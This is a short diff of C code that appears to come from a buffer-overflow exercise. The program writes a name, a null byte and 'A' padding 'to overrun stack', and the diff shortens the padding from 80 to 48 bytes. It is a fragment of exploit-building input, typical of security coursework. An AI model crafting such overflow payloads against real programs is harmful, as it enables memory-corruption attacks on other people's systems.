@@ -27,7 +27,7 @@ int main(void) {
     fprintf(psFile, "Josh Song"); /* prints name bytes */
     putc('\0', psFile); /* prints nullbyte */
 
-    for (i = 10; i < 80; i++) { /* prints padding to overrun stack */
+    for (i = 10; i < 48; i++) { /* prints padding to overrun stack */
         putc('A', psFile);
     }
 
